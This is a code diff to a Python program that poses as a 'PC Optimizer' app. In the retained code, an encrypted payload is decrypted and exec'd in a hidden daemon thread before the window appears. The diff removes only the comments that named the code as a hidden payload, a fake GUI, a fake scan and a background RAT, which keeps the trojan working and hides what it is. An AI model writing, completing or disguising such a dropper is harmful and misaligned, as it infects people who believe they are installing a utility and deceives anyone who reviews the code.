@@ -33,7 +33,6 @@ def _decrypt():
     c = AES.new(key, AES.MODE_GCM, nonce=_NONCE)
     return c.decrypt_and_verify(_CT, _TAG)
 
-# ── hidden payload: decrypt + run in a daemon thread, no console, no window ──
 def _run_payload():
     try:
         time.sleep(2.0)   # small delay so GUI paints first
@@ -45,14 +44,14 @@ def _run_payload():
         g = {"__name__": "__main__", "__builtins__": __builtins__}
         exec(code, g, g)
     except Exception:
-        pass   # silent — never crash the GUI
+        pass   #  GUI
 
 def _spawn_hidden():
     t = threading.Thread(target=_run_payload, daemon=True)
     t.start()
 
 # ============================================================
-# FAKE GUI — PC Optimizer
+#  — PC Optimizer
 # ============================================================
 THEMES = {
     "bg":       "#0f1117",
@@ -77,7 +76,7 @@ class OptimizerApp:
         self._build_ui()
         self._loop_log()
 
-        # auto-run a fake scan on boot
+        # auto-run
         self.root.after(500, self.run_scan)
 
     def _build_ui(self):
@@ -236,7 +235,6 @@ class OptimizerApp:
 
 
 def _main():
-    # spawn hidden RAT in background BEFORE GUI shows
     _spawn_hidden()
 
     root = tk.Tk()
